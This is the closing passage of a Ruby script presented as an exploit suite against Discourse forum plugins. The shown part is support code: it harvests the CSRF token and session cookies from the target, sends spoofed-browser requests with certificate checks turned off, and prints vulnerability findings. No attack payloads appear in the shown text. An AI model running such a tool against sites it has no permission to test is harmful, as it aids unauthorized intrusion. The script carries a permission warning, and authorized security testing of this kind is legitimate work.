  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def make_request_with_headers(url, method, headers)
    uri = URI(url)
    make_request(uri, method, nil, headers)
  end
  
  def make_request_with_data(endpoint, method, data = nil)
    uri = URI("#{@target_url}#{endpoint}")
    body = data ? URI.encode_www_form(data) : nil
    
    headers = {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || ''
    }
    
    make_request(uri, method, body, headers)
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    when 'Low'
      @results[:summary][:low_vulns] += 1
    end
    
    puts "  ‚úì #{vuln_data[:severity]} plugin vuln: #{vuln_data[:test_type]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE PLUGIN EXPLOIT TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    puts "Low Vulnerabilities: #{@results[:summary][:low_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_plugin_exploits_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse Plugin Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_plugin_exploits.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_plugin_exploits.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscoursePluginExploits.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nüö® CRITICAL: Plugin vulnerabilities found!"
      puts "   Plugin-based attacks possible!"
    else
      puts "\n‚úÖ No plugin vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end